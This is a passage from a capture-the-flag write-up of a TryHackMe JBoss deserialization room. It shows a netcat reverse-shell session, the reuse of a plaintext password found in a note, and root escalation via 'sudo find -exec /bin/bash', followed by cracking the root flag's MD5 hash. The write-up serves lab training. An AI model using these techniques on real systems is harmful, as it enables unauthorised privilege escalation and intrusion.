zsh: suspended  nc -lvnp 12345
                                                                                                                                                                                        
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ stty raw -echo ; fg ; reset
[1]  + continued  nc -lvnp 12345

cmnatic@thm-java-deserial:/$ stty rows 200 columns 200
cmnatic@thm-java-deserial:/$ ^C
cmnatic@thm-java-deserial:/$ 
```

Now we have a shell that survives `Ctrl + C`!

#### Search for the JBoss flag

Now we can search for the JBoss flag with `find`

```bash
cmnatic@thm-java-deserial:/$ find / -type f -name [Ff]lag.txt -print 2> /dev/null
cmnatic@thm-java-deserial:/$ find / -type f -name [Uu]ser.txt -print 2> /dev/null
cmnatic@thm-java-deserial:/$ cd /home
cmnatic@thm-java-deserial:/home$ ls
cmnatic  jboss  tony
cmnatic@thm-java-deserial:/home$ cd jboss
cmnatic@thm-java-deserial:/home/jboss$ ls -la
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt 
THM{<REDACTED>}
cmnatic@thm-java-deserial:/home/jboss$ 
```

And there we have the flag!

### Task 7 - Escalation

Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)

The final flag **does not** have the formatting of "THM{}"

Next, we enumerate the system for privilege escalation opportunities.

First we check the other files found under the `/home/jboss` directory

```bash
cmnatic@thm-java-deserial:/home/jboss$ cat note 
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
cmnatic@thm-java-deserial:/home/jboss$ cat .bash_history 
touch jboss.txt
echo "THM{5<REDACTED>}" > jboss.txt
mv jboss.txt .jboss.txt
exit
sudo -l
exit
ls
ls -lah
nano .bash_history
ls
cd ~
ls
nano .bash_history 
exit
cmnatic@thm-java-deserial:/home/jboss$ 
```

We have credentials (`jboss:likeaboss`), the JBoss flag again and a note-to-self that `sudo -l` was issued.

#### Switch user to jboss

We switch user to `jboss` and keep searching...

```bash
cmnatic@thm-java-deserial:/home/jboss$ su jboss
Password: 
jboss@thm-java-deserial:~$ id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
jboss@thm-java-deserial:~$ 
```

Next, we try `sudo -l` that we saw earlier in the `.bash_history` file

```bash
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
jboss@thm-java-deserial:~$ 
```

So we can run `/usr/bin/find`. As always, [GTFOBin is our friend](https://gtfobins.github.io/gtfobins/find/)!

```bash
jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
root@thm-java-deserial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@thm-java-deserial:~# 
```

#### Get the root flag

And finally, we can get the root flag

```bash
root@thm-java-deserial:~# cat /root/root.txt 
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
root@thm-java-deserial:~# 
```

This looks like Base64-encoded data.

```bash
root@thm-java-deserial:~# cat /root/root.txt | base64 -d
BC77AC072EE30E3760806864E234C7CFbase64: invalid input
root@thm-java-deserial:~# 
```

And what is this? Maybe a MD5-hash since the hint was `Get cracking`.  
Let's Google for it...

[MD5 Center](https://md5.gromweb.com/?md5=BC77AC072EE30E3760806864E234C7CF) tells us that the corresponding password is: `z<REDACTED>9`.

And that's the final flag!

### Task 8 - Final Remarks, Credits & Further Reading

#### Final Remarks

I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!

This type of attack can prove to be extremely dangerous - as you'd hopefully have discovered by now. It's still very real as sigh, java web applications are still used day-to-day. Because of their nature, "Serialisation" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'.

For any and all feedback, questions, problems or future ideas you'd like to be covered, please get in touch in the [TryHackMe Discord](https://discord.gg/QgC6Tdk) (following Rule #1)

So long and thanks for all the fish!

~[CMNatic](https://tryhackme.com/p/cmnatic)

#### Credits

Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)

Many thanks to [byt3bl33d3r](https://github.com/byt3bl33d3r) for providing a reliable Proof of Concept, and finally to all the contributors towards [Frohoff's Ysoserial](https://github.com/frohoff/ysoserial) which facilitates the payload generation used for this CVE.

#### Further Reading

If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:

- [https://www.baeldung.com/java-serialization](https://www.baeldung.com/java-serialization)
- [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237](https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237)

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [Apache JServ Protocol - Wikipedia](https://en.wikipedia.org/wiki/Apache_JServ_Protocol)
- [Apache Tomcat - Wikipedia](https://en.wikipedia.org/wiki/Apache_Tomcat)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [CVE-2015-7501 - NIST](https://nvd.nist.gov/vuln/detail/CVE-2015-7501)
- [dos2unix - Linux manual page](https://linux.die.net/man/1/dos2unix)
- [exiftool - Linux manual page](https://linux.die.net/man/1/exiftool)
- [ExifTool - Wikipedia](https://en.wikipedia.org/wiki/ExifTool)
- [Exploiting Java Deserialization Windows Demo - CMNatic's Ramblings](https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [find - GTFOBin](https://gtfobins.github.io/gtfobins/find/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Java (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Java_(programming_language))
- [JexBoss - GitHub](https://github.com/joaomatosf/jexboss)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [MD5 - Wikipedia](https://en.wikipedia.org/wiki/MD5)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Serialization - Wikipedia](https://en.wikipedia.org/wiki/Serialization)
- [String (computer science) - Wikipedia](https://en.wikipedia.org/wiki/String_(computer_science))
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [WildFly - Wikipedia](https://en.wikipedia.org/wiki/WildFly)
